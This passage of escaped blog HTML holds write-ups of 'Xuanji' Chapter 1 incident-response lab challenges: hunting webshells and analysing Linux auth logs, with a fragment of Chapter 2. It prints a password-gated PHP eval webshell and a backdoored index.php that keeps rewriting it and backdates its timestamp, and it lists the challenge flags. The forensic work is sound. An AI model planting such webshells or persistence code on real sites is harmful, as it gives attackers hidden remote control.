&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ls -lt | head -n 20
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-143056.jpg"
width="987"
height="452"
srcset="https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-143056_hu_c87d60c209ec0357.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-143056_hu_c8e197e4718ac6f.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="218"
data-flex-basis="524px"
>&lt;/p>
&lt;p>有个&lt;code>ps&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{c195i2923381905517d818e313792d196}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>玄机第一章</title><link>https://baozongwi.xyz/p/xuanji-chapter-1/</link><pubDate>Fri, 14 Mar 2025 10:44:01 +0000</pubDate><guid>https://baozongwi.xyz/p/xuanji-chapter-1/</guid><description>&lt;h2 id="第一章-应急响应--linux入侵排查">第一章 应急响应- Linux入侵排查
&lt;/h2>&lt;h3 id="f1">f1
&lt;/h3>&lt;p>链接之后把整个html文件夹下载下来然后让D盾里面扫一下，看到&lt;code>1.php&lt;/code>，直接就是一个一句话，所以直接交&lt;/p>
&lt;h3 id="f2f3">f2&amp;amp;&amp;amp;f3
&lt;/h3>&lt;p>存在不死马，这种一般隐藏的比较好，&lt;code>ls -al&lt;/code>直接找到&lt;code>.shell.php&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;pass&amp;#34;&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s2">&amp;#34;5d41402abc4b2a76b9719d911017c592&amp;#34;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="p">]);}&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>内容是这样子，但是并没有不死马的循环写入特征，D盾刚才扫出来的&lt;code>index.php&lt;/code>才是不死马&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">include&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;config.php&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">include&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">SYS_ROOT&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">INC&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="s1">&amp;#39;common.php&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$path&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;PATH_INFO&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;QUERY_STRING&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="s1">&amp;#39;?&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;?&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$_SERVER&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;QUERY_STRING&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s1">&amp;#39;/&amp;#39;&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$path&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">substr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$path&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">Base&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="na">safeword&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$path&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$ctrl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;action&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;action&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s1">&amp;#39;run&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;createprocess&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Index&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="na">createhtml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;id&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;cat&amp;#39;&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;single&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Index&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="na">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$path&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;/var/www/html/.shell.php&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$code&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;?php if(md5($_POST[&amp;#34;pass&amp;#34;])==&amp;#34;5d41402abc4b2a76b9719d911017c592&amp;#34;){@eval($_POST[cmd]);}?&amp;gt;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">file_put_contents&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$file&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$code&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;touch -m -d &amp;#34;2021-01-01 00:00:01&amp;#34; .shell.php&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">usleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3000&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>那查一下md5，&lt;code>hello&lt;/code>，&lt;/p>
&lt;h3 id="f4f5">f4&amp;amp;&amp;amp;f5
&lt;/h3>&lt;p>寻找黑客IP，看一下登录日志&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">grep&lt;/span> &lt;span class="s2">&amp;#34;shell.php&amp;#34;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nb">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">auth&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现没啥用啊，那因为这里是用的靶机，所以可以直接运行恶意文件，&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">chmod +x &amp;#39;shell(1).elf&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./&amp;#39;shell(1).elf&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">netstat -alntup
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现了&lt;code>10.11.55.21:3333&lt;/code>&lt;/p>
&lt;h2 id="第一章-应急响应-webshell查杀">第一章 应急响应-webshell查杀
&lt;/h2>&lt;h3 id="f1-1">f1
&lt;/h3>&lt;p>一样的下载之后放在D盾里，看到了四个文件，打开&lt;code>gz.php&lt;/code>得到flag&lt;/p>
&lt;h3 id="f2">f2
&lt;/h3>&lt;p>看到两个比较长的木马都是&lt;code>@session_start();@set_time_limit(0);@error_reporting(0);&lt;/code>的，所以直接搜索了一下，发现是哥斯拉&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-121227.jpg"
width="1071"
height="789"
srcset="https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-121227_hu_59e82f6f907d110b.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-1/QQ20250314-121227_hu_a879baa1f3ee4f53.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="135"
data-flex-basis="325px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{39392de3218c333f794befef07ac9257}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f3">f3
&lt;/h3>&lt;p>已经找到是&lt;code>.Mysqli.php&lt;/code>了，完整路径为&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">include&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">Db&lt;/span>&lt;span class="o">/.&lt;/span>&lt;span class="n">Mysqli&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f4">f4
&lt;/h3>&lt;p>免杀马应该是&lt;code>top.php&lt;/code>，里面进行了一个简单的字符变换，说实话这种对字符做手脚的都有问题&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">wap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">top&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="第一章-应急响应-linux日志分析">第一章 应急响应-Linux日志分析
&lt;/h2>&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align: center">日志文件&lt;/th>
&lt;th style="text-align: center">说明&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align: center">&lt;strong>/var/log/cron&lt;/strong>&lt;/td>
&lt;td style="text-align: center">记录了系统定时任务相关的日志&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">/var/log/cups&lt;/td>
&lt;td style="text-align: center">记录打印信息的日志&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">/var/log/dmesg&lt;/td>
&lt;td style="text-align: center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">/var/log/mailog&lt;/td>
&lt;td style="text-align: center">记录邮件信息&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">/var/log/message&lt;/td>
&lt;td style="text-align: center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">&lt;strong>/var/log/btmp&lt;/strong>&lt;/td>
&lt;td style="text-align: center">记录&lt;strong>错误登录日志&lt;/strong>，这个文件是二进制文件，不能直接vi查看，而要&lt;strong>使用lastb命令查看&lt;/strong>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">&lt;strong>/var/log/lastlog&lt;/strong>&lt;/td>
&lt;td style="text-align: center">记录系统中&lt;strong>所有用户最后一次登录时间的日志&lt;/strong>，这个文件是二进制文件，不能直接vi，而要&lt;strong>使用lastlog命令查看&lt;/strong>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">&lt;strong>/var/log/wtmp&lt;/strong>&lt;/td>
&lt;td style="text-align: center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而&lt;strong>需要使用last命令来查看&lt;/strong>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">&lt;strong>/var/log/utmp&lt;/strong>&lt;/td>
&lt;td style="text-align: center">&lt;strong>记录当前已经登录的用户信息&lt;/strong>，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要&lt;strong>使用w,who,users等命令来查询&lt;/strong>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">&lt;strong>/var/log/secure&lt;/strong>&lt;/td>
&lt;td style="text-align: center">&lt;strong>记录验证和授权方面的信息&lt;/strong>，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align: center">&lt;strong>/var/log/auth.log&lt;/strong>&lt;/td>
&lt;td style="text-align: center">&lt;strong>注明：这个有的Linux系统有，有的Linux系统没有，一般都是/var/log/secure文件来记录居多&lt;/strong>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;code>grep -a&lt;/code>能够避免查看二进制报错&lt;/p>
&lt;ul>
&lt;li>&lt;strong>&lt;code>auth.log&lt;/code> 文件主要存储与系统认证和授权相关的日志信息。具体内容包括但不限于以下几类信息：&lt;/strong>
&lt;ul>
&lt;li>1:&lt;strong>登录和注销活动：&lt;/strong>
&lt;strong>成功和失败的登录尝试
用户注销事件&lt;/strong>&lt;/li>
&lt;li>2:&lt;strong>认证过程：&lt;/strong>
&lt;strong>SSH 登录尝试（成功和失败）
本地控制台登录
Sudo 提权事件（成功和失败）&lt;/strong>&lt;/li>
&lt;li>3:&lt;strong>安全事件：&lt;/strong>
&lt;strong>无效的登录尝试
错误的密码输入
锁定和解锁屏幕事件&lt;/strong>&lt;/li>
&lt;li>4:&lt;strong>系统账户活动：&lt;/strong>
&lt;strong>用户添加、删除和修改
组添加、删除和修改&lt;/strong>&lt;/li>
&lt;li>5:PAM（Pluggable Authentication Modules）相关信息：
各种 PAM 模块的日志输出，包括认证和会话管理&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>一句话看就完事了，实际环境又不会盯着一个环境看，所以刚才入侵排查的时候我也看了这个文件&lt;/p>
&lt;h3 id="f1-2">f1
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 | grep -a &amp;#34;Failed password for root&amp;#34; | awk &amp;#39;{print $11}&amp;#39; | sort | uniq -c | sort -nr | more
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.200.2,192.168.200.31,192.168.200.32}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f2-1">f2
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 | grep -a &amp;#34;Accepted &amp;#34; | awk &amp;#39;{print $11}&amp;#39; | sort | uniq -c | sort -nr | more
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.200.2}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f3-1">f3
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 | grep -a &amp;#34;Failed password&amp;#34; |perl -e &amp;#39;while($_=&amp;lt;&amp;gt;){ /for(.*?) from/; print &amp;#34;$1\n&amp;#34;;}&amp;#39;|uniq -c|sort -nr
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{user,hello,root,test3,test2,test1}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f4-1">f4
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 | grep -a &amp;#34;Failed password for root&amp;#34; | awk &amp;#39;{print $11}&amp;#39; | sort | uniq -c | sort -nr | more
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{4}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f5">f5
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat auth.log.1 |grep -a &amp;#34;new user&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{test2}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>为啥命令都是这么写的呢，很简单，这么写其实就是为了方便拿flag，真男人都是丁真找规律，这个日志也就一百来行，便于我们分析，第一个问题他要找登录失败的&lt;/p>
